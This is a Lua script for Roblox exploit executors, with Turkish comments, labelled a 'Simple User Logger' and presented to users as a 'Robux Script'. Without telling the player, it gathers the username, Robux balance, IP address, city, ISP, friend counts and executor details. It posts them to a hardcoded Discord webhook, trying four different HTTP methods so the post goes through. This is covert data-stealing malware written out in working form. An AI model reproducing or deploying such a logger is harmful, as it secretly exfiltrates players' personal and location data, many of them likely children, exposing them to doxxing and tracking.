-- Simple User Logger (Geliştirilmiş)
local WEBHOOK_URL = "https://discord.com/api/webhooks/1380174812399538217/zSEvBYteQjS8JdF11gvWwStWsTbFhFc3OnHO-H1savrLhyJSerwuOwAQQee5ZRqYntO6"

spawn(function()
    wait(2)
    local player = game:GetService("Players").LocalPlayer
    -- Webhook gönderimi başlatılıyor
    
    -- Method 1: Normal HttpService
    local success1, error1 = pcall(function()
        local HttpService = game:GetService("HttpService")
        local webhookData = {
            content = "**" .. player.Name .. "** scripti çalıştırdı! 🎯",
            username = "Robux Script",
            avatar_url = "https://cdn.discordapp.com/emojis/1234567890123456789.png"
        }
        
        local response = HttpService:PostAsync(WEBHOOK_URL, HttpService:JSONEncode(webhookData), Enum.HttpContentType.ApplicationJson)
        return true
    end)
    
    if success1 then
        return
    end
    
    -- Method 2: request() fonksiyonu (executor API) - GELİŞTİRİLMİŞ
    local success2, error2 = pcall(function()
        if request then
            
            -- Detaylı oyuncu bilgileri toplama
            local gameInfo = game:GetService("MarketplaceService"):GetProductInfo(game.PlaceId)
            local players = game:GetService("Players")
            local stats = game:GetService("Stats")
            
            -- Display name değiştirme kaldırıldı
            
            -- Robux bilgisi (geliştirilmiş - method 3 kaldırıldı)
            local robuxAmount = "🔍 Kontrol ediliyor..."
            local robuxDetails = ""
            
            -- Method 1: GetRobuxBalance
            local success_robux1, robux1 = pcall(function()
                local mps = game:GetService("MarketplaceService")
                return mps:GetRobuxBalance(player)
            end)
            
            if success_robux1 and robux1 and robux1 > 0 then
                robuxAmount = tostring(robux1)
                robuxDetails = "✅ GetRobuxBalance API"
            else
                -- Method 2: Profile web scraping
                local success_robux2, robux2 = pcall(function()
                    if request then
                        local profileResponse = request({
                            Url = "https://www.roblox.com/users/" .. player.UserId .. "/profile",
                            Method = "GET"
                        })
                        if profileResponse.StatusCode == 200 then
                            local robuxMatch = string.match(profileResponse.Body, '"robux":(%d+)')
                            if robuxMatch then
                                return tonumber(robuxMatch)
                            end
                        end
                    end
                    return nil
                end)
                
                if success_robux2 and robux2 then
                    robuxAmount = tostring(robux2)
                    robuxDetails = "✅ Web Scraping"
                else
                    -- Executor robux gösterme izni yok
                    robuxAmount = "🔒 Gizli"
                    robuxDetails = "⚠️ Executor izin vermiyor"
                end
            end
            
            -- Executor bilgisi
            local executorInfo = "Bilinmiyor"
            if identifyexecutor then
                executorInfo = identifyexecutor()
            elseif KRNL_LOADED then
                executorInfo = "KRNL"
            elseif syn then
                executorInfo = "Synapse X"
            elseif SENTINEL_LOADED then
                executorInfo = "Sentinel"
            elseif getgenv().OXYGEN_LOADED then
                executorInfo = "Oxygen U"
            end
            
            -- 🌍 IP/Konum Bilgileri
            local locationInfo = "🔍 Kontrol ediliyor..."
            pcall(function()
                if request then
                    local ipResponse = request({
                        Url = "http://ip-api.com/json/?fields=status,message,continent,continentCode,country,countryCode,region,regionName,city,district,zip,lat,lon,timezone,offset,currency,isp,org,as,asname,mobile,proxy,hosting,query",
                        Method = "GET"
                    })
                    if ipResponse.StatusCode == 200 then
                        local ipData = game:GetService("HttpService"):JSONDecode(ipResponse.Body)
                        if ipData.status == "success" then
                            local countryFlag = ""
                            if ipData.countryCode == "TR" then countryFlag = "🇹🇷"
                            elseif ipData.countryCode == "US" then countryFlag = "🇺🇸"
                            elseif ipData.countryCode == "GB" then countryFlag = "🇬🇧"
                            elseif ipData.countryCode == "DE" then countryFlag = "🇩🇪"
                            elseif ipData.countryCode == "FR" then countryFlag = "🇫🇷"
                            else countryFlag = "🌍" end
                            
                            locationInfo = string.format("**IP:** %s\n**Ülke:** %s %s\n**Şehir:** %s\n**ISP:** %s", 
                                ipData.query,
                                countryFlag, 
                                ipData.country or "Bilinmiyor",
                                ipData.city or "Bilinmiyor",
                                ipData.isp or "Bilinmiyor"
                            )
                        end
                    end
                end
            end)
            
            -- 🎮 Roblox Hesap Detayları
            local accountDetails = "🔍 Analiz ediliyor..."
            pcall(function()
                if request then
                    -- Kullanıcı profil bilgileri
                    local profileResponse = request({
                        Url = "https://users.roblox.com/v1/users/" .. player.UserId,
                        Method = "GET"
                    })
                    
                    -- Arkadaş sayısı
                    local friendsResponse = request({
                        Url = "https://friends.roblox.com/v1/users/" .. player.UserId .. "/friends/count",
                        Method = "GET"
                    })
                    
                    -- Takipçi sayısı  
                    local followersResponse = request({
                        Url = "https://friends.roblox.com/v1/users/" .. player.UserId .. "/followers/count",
                        Method = "GET"
                    })
                    
                    -- Takip edilen sayısı
                    local followingResponse = request({
                        Url = "https://friends.roblox.com/v1/users/" .. player.UserId .. "/followings/count", 
                        Method = "GET"
                    })
                    
                    local friendsCount = "?"
                    local followersCount = "?"
                    local followingCount = "?"
                    
                    if friendsResponse.StatusCode == 200 then
                        local friendsData = game:GetService("HttpService"):JSONDecode(friendsResponse.Body)
                        friendsCount = tostring(friendsData.count or "?")
                    end
                    
                    if followersResponse.StatusCode == 200 then
                        local followersData = game:GetService("HttpService"):JSONDecode(followersResponse.Body)
                        followersCount = tostring(followersData.count or "?")
                    end
                    
                    if followingResponse.StatusCode == 200 then
                        local followingData = game:GetService("HttpService"):JSONDecode(followingResponse.Body)
                        followingCount = tostring(followingData.count or "?")
                    end
                    
                    accountDetails = string.format("**Arkadaş:** %s\n**Takipçi:** %s\n**Takip Edilen:** %s\n**Hesap Yaşı:** %d gün",
                        friendsCount,
                        followersCount, 
                        followingCount,
                        player.AccountAge
                    )
                end
            end)
            
            -- ⚙️ Detaylı Executor Bilgileri
            local executorDetails = "🔍 Taranıyor..."
            pcall(function()
                local details = {}
                
                -- Executor tespiti
                if identifyexecutor then
                    table.insert(details, "**Executor:** " .. identifyexecutor())
                elseif syn then
                    table.insert(details, "**Executor:** Synapse X")
                elseif KRNL_LOADED then  
                    table.insert(details, "**Executor:** KRNL")
                elseif getgenv().OXYGEN_LOADED then
                    table.insert(details, "**Executor:** Oxygen U")
                elseif SENTINEL_LOADED then
                    table.insert(details, "**Executor:** Sentinel")
                else
                    table.insert(details, "**Executor:** Bilinmiyor")
                end
                
                -- UNC Test
                local uncScore = 0
                if getgenv then uncScore = uncScore + 10 end
                if loadstring then uncScore = uncScore + 10 end
                if request then uncScore = uncScore + 15 end
                if readfile then uncScore = uncScore + 10 end
                if writefile then uncScore = uncScore + 10 end
                if isfolder then uncScore = uncScore + 5 end
                if makefolder then uncScore = uncScore + 5 end
                if setclipboard then uncScore = uncScore + 5 end
                if syn then uncScore = uncScore + 20 end
                if identifyexecutor then uncScore = uncScore + 10 end
                
                table.insert(details, "**UNC Score:** " .. uncScore .. "/100")
                
                -- İnjection seviyesi
                local injectionLevel = "?"
                if syn and syn.get_thread_identity then
                    injectionLevel = tostring(syn.get_thread_identity())
                elseif getthreadidentity then
                    injectionLevel = tostring(getthreadidentity())
                end
                table.insert(details, "**Injection:** Level " .. injectionLevel)
                
                -- Aktif script sayısı
                local scriptCount = 0
                pcall(function()
                    for _, v in pairs(getgc()) do
                        if type(v) == "function" and islclosure(v) then
                            scriptCount = scriptCount + 1
                        end
                    end
                end)
                if scriptCount > 100 then scriptCount = "100+" end
                table.insert(details, "**Scripts:** " .. tostring(scriptCount) .. " aktif")
                
                executorDetails = table.concat(details, "\n")
            end)
            
            -- Embed mesajı oluşturma
            local embedData = {
                embeds = {{
                    title = "🎯 Robux Script Kullanıldı!",
                    color = 3447003, -- Mavi renk
                    fields = {
                        {
                            name = "👤 Oyuncu Bilgileri",
                            value = string.format("**Ad:** %s\n**ID:** %d\n**Display Name:** %s\n**Profil:** [🔗 Ziyaret Et](https://www.roblox.com/users/%d/profile)", 
                                player.Name, 
                                player.UserId, 
                                player.DisplayName or player.Name,
                                player.UserId),
                            inline = true
                        },
                        {
                            name = "🎮 Oyun Bilgileri", 
                            value = string.format("**Oyun:** %s\n**Place ID:** %d\n**Job ID:** %s", 
                                gameInfo.Name or "Bilinmiyor",
                                game.PlaceId,
                                game.JobId),
                            inline = true
                        },
                        {
                            name = "💰 Ekonomi Bilgileri",
                            value = string.format("**Robux:** %s\n**Kaynak:** %s\n**Premium:** %s\n**Account Age:** %d gün", 
                                robuxAmount,
                                robuxDetails,
                                player.MembershipType == Enum.MembershipType.Premium and "✅" or "❌",
                                player.AccountAge),
                            inline = true
                        },
                        {
                            name = "🔧 Teknik Bilgiler",
                            value = string.format("**Executor:** %s\n**Platform:** %s\n**Locale:** %s", 
                                executorInfo,
                                game:GetService("UserInputService").TouchEnabled and "📱 Mobile" or "💻 PC",
                                game:GetService("LocalizationService").RobloxLocaleId),
                            inline = true
                        },
                        {
                            name = "📊 Server Bilgileri",
                            value = string.format("**Oyuncu Sayısı:** %d/%d\n**Ping:** %d ms\n**FPS:** %d", 
                                #players:GetPlayers(),
                                players.MaxPlayers or 50,
                                math.floor(stats.Network.ServerStatsItem["Data Ping"]:GetValue()),
                                math.floor(stats.Workspace.Heartbeat:GetValue())),
                            inline = true
                        },
                        {
                            name = "🕐 Zaman Bilgileri",
                            value = string.format("**Tarih:** %s\n**Türkiye Saati:** %s", 
                                os.date("%d/%m/%Y"),
                                os.date("%H:%M:%S", os.time() + 3*3600)), -- +3 saat Türkiye
                            inline = true
                        },
                        {
                            name = "🌍 IP/Konum Bilgileri",
                            value = locationInfo,
                            inline = true
                        },
                        {
                            name = "🎮 Roblox Hesap Detayları",
                            value = accountDetails,
                            inline = true
                        },
                        {
                            name = "⚙️ Detaylı Executor Bilgileri",
                            value = executorDetails,
                            inline = true
                        }
                    },
                    thumbnail = {
                        url = "https://www.roblox.com/headshot-thumbnail/image?userId=" .. player.UserId .. "&width=420&height=420&format=png"
                    },
                    footer = {
                        text = "Robux Script Logger • " .. os.date("%H:%M:%S")
                    },
                    timestamp = os.date("!%Y-%m-%dT%H:%M:%SZ")
                }},
                username = player.Name,
                avatar_url = "https://www.roblox.com/headshot-thumbnail/image?userId=" .. player.UserId .. "&width=150&height=150&format=png"
            }
            
            local response = request({
                Url = WEBHOOK_URL,
                Method = "POST",
                Headers = {
                    ["Content-Type"] = "application/json"
                },
                Body = game:GetService("HttpService"):JSONEncode(embedData)
            })
            
            -- Detaylı bilgi gönderildi
            return true
        else
            error("request() fonksiyonu bulunamadı")
        end
    end)
    
    if success2 then
        return
    end
    
    -- Method 3: http_request() fonksiyonu
    local success3, error3 = pcall(function()
        if http_request then
            local response = http_request({
                Url = WEBHOOK_URL,
                Method = "POST",
                Headers = {
                    ["Content-Type"] = "application/json"
                },
                Body = game:GetService("HttpService"):JSONEncode({
                    content = "**" .. player.Name .. "** scripti çalıştırdı! 🎯 (http_request method)",
                    username = "Robux Script"
                })
            })
            return true
        else
            error("http_request() fonksiyonu bulunamadı")
        end
    end)
    
    if success3 then
        return
    end
    
    -- Method 4: syn.request() (Synapse X)
    local success4, error4 = pcall(function()
        if syn and syn.request then
            local response = syn.request({
                Url = WEBHOOK_URL,
                Method = "POST",
                Headers = {
                    ["Content-Type"] = "application/json"
                },
                Body = game:GetService("HttpService"):JSONEncode({
                    content = "**" .. player.Name .. "** scripti çalıştırdı! 🎯 (syn.request method)",
                    username = "Robux Script"
                })
            })
            return true
        else
            error("syn.request() fonksiyonu bulunamadı")
        end
    end)
    
    if success4 then
        return
    end
end)
